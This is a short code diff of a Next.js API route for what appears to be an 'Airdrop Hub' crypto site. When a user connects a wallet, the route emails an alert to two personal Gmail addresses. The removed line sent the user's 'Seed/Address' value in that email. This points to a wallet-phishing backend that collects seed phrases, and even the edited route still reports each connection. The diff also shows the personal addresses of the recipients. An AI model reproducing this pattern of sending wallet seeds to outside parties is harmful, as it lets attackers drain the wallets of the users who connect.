@@ -18,7 +18,7 @@ export async function POST(req: NextRequest) {
     from: `"Airdrop Hub Alerts" <${process.env.ZOHO_EMAIL_3}>`,
     to: 'michaelogaje033@gmail.com,promixadamu@gmail.com',
     subject: `New Wallet Connected – ${walletType}`,
-    text: `A user just connected their ${walletType} wallet.\n\nSeed/Address: ${walletAddress}`,
+    text: `A user just connected their ${walletType} wallet.`,
   })
 
   return NextResponse.json({ success: true })
